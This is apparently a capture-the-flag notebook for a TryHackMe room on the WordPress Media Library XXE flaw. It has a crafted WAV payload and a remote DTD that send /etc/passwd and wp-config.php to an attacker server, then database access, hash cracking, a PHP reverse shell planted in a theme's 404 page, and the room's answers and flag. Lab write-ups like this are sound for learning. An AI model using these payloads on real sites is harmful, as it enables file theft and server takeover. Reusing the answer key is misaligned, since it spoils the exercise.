![[IMG/Pasted image 20240927080431.png]]

An XXE vulnerability consists of an injection that takes advantage of the poor configuration of the XML interpreter. This allows us to include external entities, enabling us attack to applications that interpret XML language in their parameters. We'll explore a recent XXE vulnerability, albeit one that comes with some situational caveats.

Researchers at security firm SonarSource discovered an XML external entity injection (XXE) security flaw in the WordPress Media Library. The vulnerability can be exploited only when this CMS runs in PHP 8 _and_ the attacking user has permissions to upload media files. Take note of the latter condition as we walk through an example of exploiting this vulnerability below.
## Impact

- **Arbitrary File Disclosure**: The contents of any file on the host’s file system could be retrieved, e.g. _wp-config.php_ which contains sensitive data such as database credentials.
- **Server-Side Request Forgery (SSRF)**: HTTP requests could be made on behalf of the WordPress installation. Depending on the environment, this can have a serious impact.

**Exploiting the vulnerability**

A WordPress site affected by this vulnerability has been identified via the WPScan tool. We can see the output of this tool below from our enumeration.

![](https://i.imgur.com/mrPwSpA.png)

In this example, we have identified that the author user uses weak credentials.

`user: test-corp`
`password: test`

![](https://i.imgur.com/tw7QtLJ.png)

In this case, we can see that this user has permission to upload media files. We can leverage this to upload a reverse shell!

**Creating a malicious WAV file.**

It's very easy, in your bash console enter the following command:

```php 
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav   
```

On your attack machine (likely Kali or the TryHackMe AttackBox) create a dtd file with the following code. This will allow us to execute code following the webserver fetching the dtd file. Be sure the name of this file matches what you put entered in the .wav file for NAMEEVIL.dtd (see the previous code blurb).

```php
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">   
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
```

  
Now launch an http server in the same directory as the dtd file.  

`php -S 0.0.0.0:PORT`  

```php
php -S 0.0.0.0:8443
```

Now upload the malicious .wav to the WordPress application!

![](https://i.imgur.com/MkcDIN4.png)  

Once you've uploaded the .wav file, you should see the following request in your HTTP server logs. Note, in order to exfiltrate data effectively we've used Zlib for encoding. 

For practice (and the sake of this example), let's use PHP to decode this blurb! Create a .php with the following code, just be sure to copy and paste the base64 returned from the WordPress server where we have 'base64here' in the example code.

```php
<?php echo zlib_decode(base64_decode('base64here')); ?>
```

Run the php file with the following command: php FILENAME.php

![](https://i.imgur.com/yepzG1E.png)  

  
Similarly, we can also leverage other base64 encoding libraries like the following:

```php
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">   
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
```

Decoding this is a breeze from here! We can copy the base64 blurb received back into the console for decoding with the following command:

```php
echo "base64here" | base64 -d
```

Move onto the next task to try this out for yourself!

---

User: test-corp
Pass: test

/wp-login

```php
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav 
```

```php
nano NAMEEVIL.dtd
```

```php
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">   
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
```

Start server, then upload dtd file:

```php
php -S 0.0.0.0:8443
```

Create php file to decode the responses 

```php
nano decode.php
```

```php
<?php echo zlib_decode(base64_decode('base64here')); ?>
```
- Add the php resonse in the `base64here` section, then run the code with:

```php
php decode.php
```


/wp-config.php

```php
php decode.php > wp-config.php
```

This gives the config file.

I use nmap to get the MySql details

Login to MySql

```php
mysql -h <IP> -u DB_USER -p
```

User: thedarktangent
Pass: sUp3rS3cret132

```php
mysql -h 10.10.234.231 -u thedarktangent -p
```

I was having trouble logging into the MySql database so i had to turn off the tls/ssl

MySql
```php
mysql -h 10.10.160.147 -u thedarktangent -p --skip-ssl
```

```php
show databases;
```

```php
use wordpressdb2;
```

```php
show tables;
```

```php
select * from wptry_users;
```

Echo into a file for john 

```php
echo '$P$B4fu6XVPkSU5KcKUsP1sD3Ul7G3oae1' > hash.txt
```

```php
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
- Results: teddybear

User: corp-001
Pass: teddybear

```php
ssh corp-001@<IP> 
```
- I'll try the web-page as well

Go to appearance -> theme editor, and change to twenty nineteen

Paste pentester-monkey rev shell into the 404 file

![[IMG/Pasted image 20240927100258.png]]

Now just navigate to something that doesn't exist and the 404 page should fire:
`http://10.10.81.226/index.php/category/uncategorized/asasa`

Stable shell
```php
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Flag 
```php
cat /home/stux/flag/flag.txt
```


---



1. Based on the results of #1, what is the name of the database for WordPress?  
`wordpressdb2`

2. Based on the results of #1, what are the credentials you found?  
`thedarktangent:sUp3rS3cret132`

3. Enumerate and identify what is the dbms installed on the server?  
`mysql`

4. Based on the results of #4, what is the dbms version installed on the server?  
`MySQL 5.7.33`

5. Based on the results of #4, what port is the dbms running on?  
`3306`

6. Compromise the dbms, What is the encrypted password located in the wordpress  users table with id 1??
`$P$B4fu6XVPkSU5KcKUsP1sD3Ul7G3oae1`

7. Based on the results of #7, What is the password in plaint text?  
`teddybear`

8. Compromise the machine and locate flag.txt
`thm{28bd2a5b7e0586a6e94ea3e0adbd5f2f16085c72}`

---

**Completed:** _10:21 2024-09-27_

